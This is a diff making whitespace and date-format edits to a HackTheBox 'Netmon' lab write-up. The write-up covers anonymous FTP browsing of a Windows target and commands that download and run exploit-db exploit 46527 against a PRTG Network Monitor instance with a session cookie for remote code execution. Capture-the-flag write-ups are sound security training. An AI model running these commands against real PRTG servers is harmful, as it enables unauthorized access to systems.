@@ -1,6 +1,6 @@
 ---
 title: "HackTheBox: Netmon - Writeup"
-date: 2019-07-01 00:00:00 +0300
+date: 2019-07-01 00:00:00
 categories: [cybersec, infosec, hackthebox]
 tags: [authenticated rce, ftp, network monitor, PRTG, rce]
 ---
@@ -68,7 +68,7 @@ The scan tells us that there is `HTTP` on Port 80 and `FTP` on Port 21 which we 
 Let's take a look at the `FTP` by logging in anonymously.
 
 ```
-ncftp / > ls -la    
+ncftp / > ls -la
 02-03-19  12:18AM                 1024 .rnd
 02-25-19  10:15PM       <DIR>          inetpub
 07-16-16  09:18AM       <DIR>          PerfLogs
@@ -77,12 +77,13 @@ ncftp / > ls -la
 02-03-19  08:08AM       <DIR>          Users
 02-25-19  11:49PM       <DIR>          Windows
 
-ncftp / > cd Users/          
+ncftp / > cd Users/
 ncftp /Users > ls -la
 02-25-19  11:44PM       <DIR>          Administrator
 02-03-19  12:35AM       <DIR>          Public
 
-ncftp /Users > cd Public/   
+ncftp /Users > cd Public/
+
 ncftp /Users/Public > ls -la
 02-03-19  08:05AM       <DIR>          Documents
 07-16-16  09:18AM       <DIR>          Downloads
@@ -109,6 +110,7 @@ some files regarding the login credentials was fruitful as there were 3 configur
 
 ```
 ncftp / > cd ProgramData
+
 ncftp /ProgramData > ls -la
 02-03-19  12:15AM       <DIR>          Licenses
 11-20-16  10:36PM       <DIR>          Microsoft
@@ -215,7 +217,9 @@ Since we logged in to PRTG Network Manager, we can use the developer console to 
 
 ```
 $ wget https://www.exploit-db.com/download/46527
+
 $ sed -i -e 's/\r$//' 46527
+
 $ ./46527 -u http://10.10.10.152 -c "OCTOPUS1813713946=ezk4RkMxM0M4LTkxMzYtNEVDOS1CODgwLTc4OUY5QjJERjJFN30%3D; _gat=1"
 
 [+]#########################################################################[+]
